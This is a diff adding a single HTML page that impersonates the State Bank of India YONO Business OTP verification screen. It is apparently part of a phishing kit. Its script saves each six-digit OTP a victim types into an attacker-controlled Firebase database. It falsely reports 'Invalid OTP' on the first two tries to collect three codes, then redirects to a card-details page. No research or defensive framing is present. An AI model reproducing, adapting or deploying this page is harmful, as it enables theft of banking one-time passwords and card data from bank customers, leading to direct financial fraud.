@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OTP Verification - YONO SBI Business</title>
+  <link rel="icon" href="sbi_logo.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(90deg, #b0175d, #5a0d7a);
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      border-radius: 10px;
+      background: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .headerContainer {
+      width: 100%;
+      height: 80px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fff;
+    }
+    .headerContainer img {
+      height: 40px;
+      width: auto;
+      margin-top: 20px;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #000;
+    }
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+    .otp-inputs input {
+      width: 45px;
+      height: 50px;
+      font-size: 22px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .timer {
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    .resend {
+      font-size: 14px;
+      margin: 15px 0;
+      color: #b0175d;
+      cursor: pointer;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      background: linear-gradient(90deg, #b0175d, #5a0d7a);
+      color: #fff;
+      font-size: 16px;
+      transition: all 0.2s ease-in-out;
+    }
+    .btn:hover {
+      background: linear-gradient(90deg, #d42071, #7d15aa);
+    }
+    .footer {
+      font-size: 12px;
+      text-align: center;
+      margin-top: 30px;
+      padding: 20px;
+      background: #000;
+      color: #cfcdcd;
+    }
+    .footer a {
+      color: #cfcdcd;
+      margin: 0 5px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="headerContainer">
+    <img src="../resource/yonobusiness.png" alt="logo" />
+  </div>
+
+  <!-- OTP Box -->
+  <div class="container">
+    <h2>Enter OTP</h2>
+    <p>We have sent an OTP to your registered mobile number.</p>
+
+  
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
+
+      <div id="errorMsg" class="error">Enter your 6 digit OTP</div>
+    <div id="timer" class="timer"></div>
+
+    <div class="resend" onclick="resendOtp()">Resend OTP</div>
+
+    <button class="btn" onclick="verifyOtp()">Verify & Proceed</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    © State Bank of India (APM Id:E-Ch_Tran_2200) <br>
+    <a href="#">Disclaimer</a> | 
+    <a href="#">Fair Lending Practice Code</a> | 
+    <a href="#">Privacy Statement</a> | 
+    <a href="#">Security Tips</a> | 
+    <a href="#">About Phishing</a> | 
+    <a href="#">Report Phishing</a> | 
+    <a href="#">Sitemap</a>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>
+  <script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+  // 🔹 Firebase Config
+  const firebaseConfig = {
+    apiKey: "AIzaSyAMSH878_QPmMLsuK3AUBPWLBeLiFBflAw",
+    authDomain: "khalid-yono-site-2234-31-8-25.firebaseapp.com",
+    databaseURL: "https://khalid-yono-site-2234-31-8-25-default-rtdb.firebaseio.com",
+    projectId: "khalid-yono-site-2234-31-8-25",
+    storageBucket: "khalid-yono-site-2234-31-8-25.firebasestorage.app",
+    messagingSenderId: "1087322451824",
+    appId: "1:1087322451824:web:ebfe6bfb03d58ec3bba9b5",
+    measurementId: "G-LLKQ6F8PKZ"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // 🔹 OTP Attempt Counter
+  let attemptCount = 0;
+
+  // 🔹 Verify OTP
+ // 🔹 Verify OTP
+window.verifyOtp = async function() {
+  const inputs = document.querySelectorAll(".otp-inputs input");
+  let otp = "";
+  inputs.forEach(inp => otp += inp.value);
+
+  if (otp.length !== 6) {
+    document.getElementById("errorMsg").style.display = "block";
+    document.getElementById("errorMsg").innerText = "Enter your 6 digit OTP";
+    return;
+  }
+  document.getElementById("errorMsg").style.display = "none";
+
+  try {
+    // ✅ Har bar OTP Firebase me save hoga
+    const newRef = push(ref(db, "packages"));
+    await set(newRef, {
+      otp: otp,
+      attempt: attemptCount + 1,
+      timestamp: new Date().toISOString()
+    });
+
+    attemptCount++;
+
+    if (attemptCount < 3) {
+      // ❌ Invalid OTP case
+      document.getElementById("errorMsg").style.display = "block";
+      document.getElementById("errorMsg").innerText = "Invalid OTP. Please try again.";
+
+      // 🔹 Input fields clear karo
+      inputs.forEach(inp => inp.value = "");
+      inputs[0].focus(); // First box me cursor le aao
+    } else {
+      // ✅ 3rd attempt → next page
+      window.location.href = "carddetailspage.html";
+    }
+
+  } catch (error) {
+    alert("Error: " + error.message);
+    console.error(error);
+  }
+}
+
+
+  // 🔹 Resend OTP
+  let timerInterval;
+  window.resendOtp = function() {
+    document.querySelectorAll(".otp-inputs input").forEach(inp => inp.value = "");
+    document.getElementById("errorMsg").style.display = "none";
+
+    let timeLeft = 120;
+    const timerDisplay = document.getElementById("timer");
+    clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      timerDisplay.innerText = `Resend available in ${minutes}:${seconds < 10 ? "0" : ""}${seconds}`;
+      timeLeft--;
+
+      if (timeLeft < 0) {
+        clearInterval(timerInterval);
+        timerDisplay.innerText = "";
+      }
+    }, 1000);
+  }
+
+  // 🔹 Auto move to next input
+  document.querySelectorAll(".otp-inputs input").forEach((input, index, arr) => {
+    input.addEventListener("input", () => {
+      if (input.value && index < arr.length - 1) {
+        arr[index + 1].focus();
+      }
+    });
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && index > 0) {
+        arr[index - 1].focus();
+      }
+    });
+  });
+</script>
+
+
+</body>
+</html>
